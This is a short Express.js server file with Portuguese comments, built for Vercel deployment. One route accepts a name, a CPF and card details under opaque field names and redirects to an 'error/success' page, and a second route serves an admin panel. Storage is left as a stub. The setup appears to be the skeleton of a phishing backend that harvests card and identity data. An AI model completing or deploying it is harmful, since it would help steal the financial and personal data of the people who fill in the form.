const express = require('express');
const path = require('path');

const app = express();

// Configurações do Express
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
// Nota: Removemos o app.use(express.static) porque a Vercel já serve a pasta /public automaticamente.

// ---------------------------------------------------------
// ROTA 1: SALVAR DADOS
// O seu formulário envia para /salvar, mas na Vercel usaremos /api/salvar
app.post('/api/salvar', (req, res) => {
    const { dado1, dado2, dado3, cpf, nome } = req.body;
    
    // AQUI ENTRARIA A CONEXÃO COM O BANCO DE DADOS NA NUVEM.
    // Como o SQLite não grava na Vercel, a recomendação é usar o Firebase Realtime Database
    // para fazer o insert desses dados (nome, cpf, cartão, etc).
    
    console.log("Dados recebidos (temporário):", nome, cpf);

    // Redireciona o usuário para a página de erro/sucesso após o envio
    res.redirect('/?sucesso=true');
});

// ---------------------------------------------------------
// ROTA 2: BUSCAR DADOS (Painel Admin)
app.get('/api/dados', (req, res) => {
    
    // AQUI VOCÊ BUSCARIA OS DADOS DO FIREBASE (ou outro banco na nuvem)
    // Para a página do painel não dar "Erro de conexão", 
    // vamos retornar um array vazio temporariamente até você plugar um banco em nuvem:
    res.json([]);
});

// ---------------------------------------------------------
// A GRANDE MUDANÇA PARA A VERCEL:
// Sai o app.listen(porta) e entra o module.exports
module.exports = app;
